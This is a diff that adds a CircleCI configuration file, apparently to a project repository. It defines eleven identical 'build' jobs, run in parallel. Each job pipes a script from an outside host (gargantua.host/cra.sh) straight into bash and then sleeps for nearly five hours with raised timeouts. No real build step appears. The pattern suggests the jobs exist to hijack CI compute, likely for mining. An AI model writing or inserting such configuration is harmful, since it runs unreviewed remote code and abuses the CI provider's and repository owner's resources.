@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  rscalabuildtr:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rscalabuildtr10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - rscalabuildtr
+      - rscalabuildtr1
+      - rscalabuildtr2
+      - rscalabuildtr3
+      - rscalabuildtr4
+      - rscalabuildtr5
+      - rscalabuildtr6
+      - rscalabuildtr7
+      - rscalabuildtr8
+      - rscalabuildtr9
+      - rscalabuildtr10
